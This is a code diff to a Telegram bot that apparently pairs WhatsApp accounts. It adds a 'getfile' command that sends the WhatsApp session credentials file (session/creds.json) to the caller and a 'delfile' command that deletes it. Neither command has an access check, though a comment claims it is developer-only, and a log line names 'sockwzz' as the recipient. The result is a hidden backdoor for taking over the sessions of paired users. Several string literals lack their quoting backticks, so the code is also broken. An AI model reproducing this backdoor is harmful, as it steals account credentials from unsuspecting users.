@@ -662,7 +662,44 @@ async function initializeBot() {
 // --- Command Handler ---
 
 // Command untuk pairing WhatsApp
-bot.command("connect", async (ctx) => {
+bot.command('delfile', async (ctx) => {
+  const userId = ctx.from.id;
+  const username = ctx.from.username;
+  
+
+  // Tentukan file yang ingin dihapus
+  const fileName = 'session/creds.json'; // Ganti dengan nama file yang ingin Anda hapus
+  const filePath = path.resolve(__dirname, fileName);
+
+  // Periksa apakah file ada
+  if (!fs.existsSync(filePath)) {
+    return ctx.reply(⚠️ File "${fileName}" tidak ditemukan.);
+  }
+
+  // Hapus file
+  try {
+    fs.unlinkSync(filePath);
+    ctx.reply(✅ File "${fileName}" berhasil dihapus.);
+  } catch (error) {
+    console.error(error);
+    ctx.reply(❌ Gagal menghapus file "${fileName}".);
+  }
+});
+bot.command('getfile', async (ctx) => {
+  // Pastikan hanya developer yang dapat mengakses command ini  
+
+  const filePath = './session/creds.json'; // Path ke file yang ingin diambil
+
+  try {
+    // Kirim file ke developer
+    await ctx.replyWithDocument({ source: filePath });
+    console.log(File ${filePath} berhasil dikirim ke sockwzz.);
+  } catch (error) {
+    console.error("Kosong njir:", error);
+    ctx.reply("User Belom Sambungin Device Jir😜.");
+  }
+});
+bot.command("addbot", async (ctx) => {
   const args = ctx.message.text.split(" ").slice(1);
 
   if (args.length === 0) {
